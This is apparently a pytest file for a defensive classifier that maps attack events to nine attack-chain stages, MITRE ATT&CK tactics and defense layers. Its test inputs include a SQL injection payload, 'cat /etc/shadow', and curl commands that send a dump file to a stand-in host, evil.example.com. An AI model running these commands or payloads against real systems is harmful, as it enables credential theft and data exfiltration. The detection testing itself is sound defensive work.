"""Faz 35 - 9-Asamali saldiri zinciri siniflandiricisi testleri."""
from arachne.intel import attack_stages as st


def test_stages_and_maps_are_complete_and_aligned():
    """9 asama; her asama hem ATT&CK taktigine hem dome katmanina eslenmeli."""
    assert len(st.STAGES) == 9
    assert set(st.STAGE_MITRE) == set(st.STAGES)
    assert set(st.STAGE_DEFENSE_LAYER) == set(st.STAGES)
    valid_layers = {"soar", "posture", "zero_trust", "mtd", "collective",
                    "ensemble", "waf", "fingerprint", "slow_burn",
                    "deception_grid", "honeytoken", "deception", "detection",
                    "integrity"}
    assert set(st.STAGE_DEFENSE_LAYER.values()) <= valid_layers


def test_classify_recon_from_scanner_user_agent():
    r = st.classify_stage("GET /robots.txt", event_type="GET")
    assert r["stage"] == "Reconnaissance"
    assert r["defense_layer"] == "deception"
    assert r["mitre_tactic"]["id"] == "TA0043"
    assert r["indicators"]


def test_classify_scanning_from_directory_bruteforce():
    r = st.classify_stage("GET /wp-admin/ HTTP/1.1 User-Agent: gobuster")
    assert r["stage"] == "Scanning"
    assert r["defense_layer"] == "detection"
    assert r["mitre_tactic"]["name"] == "Discovery"


def test_classify_initial_access_from_exploit_payload():
    r = st.classify_stage("username=' UNION SELECT password FROM users--")
    assert r["stage"] == "Initial Access"
    assert r["defense_layer"] == "waf"
    assert r["mitre_tactic"]["id"] == "TA0001"


def test_classify_credential_access_from_shadow():
    r = st.classify_stage("cat /etc/shadow")
    assert r["stage"] == "Credential Access"
    assert r["defense_layer"] == "honeytoken"
    assert r["confidence"] > 0.0


def test_classify_lateral_movement_internal_ip():
    r = st.classify_stage("ssh admin@192.168.1.50 psexec")
    assert r["stage"] == "Lateral Movement"
    assert r["defense_layer"] == "deception_grid"


def test_classify_exfiltration_curl_external():
    r = st.classify_stage("curl https://evil.example.com/steal -d @/tmp/dump",
                          event_type="POST")
    assert r["stage"] == "Exfiltration"
    assert r["defense_layer"] == "soar"
    assert r["mitre_tactic"]["id"] == "TA0010"


def test_classify_no_match_returns_none_honestly():
    r = st.classify_stage("hello world")
    assert r["stage"] is None
    assert r["confidence"] == 0.0
    assert r["indicators"] == []
    assert r["defense_layer"] is None


def test_confidence_is_bounded():
    r = st.classify_stage("cat /etc/shadow ; whoami ; sudo su")
    assert 0.0 <= r["confidence"] <= 1.0


def test_stage_progression_tracks_furthest_and_progress():
    events = [
        {"payload": "GET /robots.txt", "event_type": "GET", "timestamp": "t1"},
        {"payload": "GET /wp-admin/", "event_type": "GET", "timestamp": "t2"},
        {"payload": "' UNION SELECT pw FROM users--", "timestamp": "t3"},
        {"payload": "curl http://evil.example.com/x", "event_type": "POST",
         "timestamp": "t4"},
    ]
    prog = st.stage_progression(events)
    assert prog["furthest_stage"] == "Exfiltration"
    assert prog["current_stage"] == "Exfiltration"
    assert prog["stages_reached"] == prog["stages_reached"]  # sirali
    assert prog["stages_reached"][0] == "Reconnaissance"
    assert prog["progress_pct"] == 100
    assert len(prog["timeline"]) == 4
    assert {"id": "TA0043", "name": "Reconnaissance"} in prog["mitre_tactics"]


def test_stage_progression_empty_events():
    prog = st.stage_progression([])
    assert prog["stages_reached"] == []
    assert prog["current_stage"] is None
    assert prog["progress_pct"] == 0


def test_replay_timeline_is_ordered_and_skips_unknown():
    events = [
        {"payload": "GET /robots.txt", "event_type": "GET", "timestamp": "t1"},
        {"payload": "harmless keepalive", "timestamp": "t2"},  # asamasiz -> atlanir
        {"payload": "cat /etc/shadow", "timestamp": "t3"},
    ]
    steps = st.replay_timeline(events)
    assert [s["step"] for s in steps] == [1, 2]
    assert steps[0]["stage"] == "Reconnaissance"
    assert steps[1]["stage"] == "Credential Access"
    assert steps[1]["defense_layer"] == "honeytoken"
    assert steps[0]["mitre_tactic"]["id"] == "TA0043"
    assert len(steps[0]["payload_excerpt"]) <= 80
